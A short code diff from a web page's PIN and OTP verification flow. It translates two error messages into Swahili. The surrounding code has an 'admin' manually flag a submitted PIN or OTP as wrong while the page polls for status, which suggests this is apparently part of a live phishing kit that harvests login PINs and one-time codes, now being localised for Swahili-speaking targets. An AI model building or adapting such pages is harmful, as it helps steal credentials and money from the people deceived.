@@ -1136,7 +1136,7 @@
         } else if (data.status === 'wrongpin_otp') {
           // Admin flagged PIN as wrong — send user back to login
           clearInterval(otpPollInterval);
-          showOtpMsg('error', 'Incorrect PIN detected. Redirecting to login…');
+          showOtpMsg('error', 'PIN uliyoweka si sahihi. Inaelekezwa kwenye ukurasa wa kuingia...');
           setTimeout(() => {
             // Clear OTP textarea
             document.getElementById('otpInput').value = '';
@@ -1167,7 +1167,7 @@
           chkOtp();
           document.getElementById('bOtp').disabled = false;
           
-          showOtpMsg('error', 'Incorrect OTP code. Please check and re-enter.');
+          showOtpMsg('error', 'Ujumbe uliobandika si sahihi. Tafadhali ukague kisha uuweke tena.');
           
           if (S.otpAttempts >= 2) {
             setTimeout(() => {
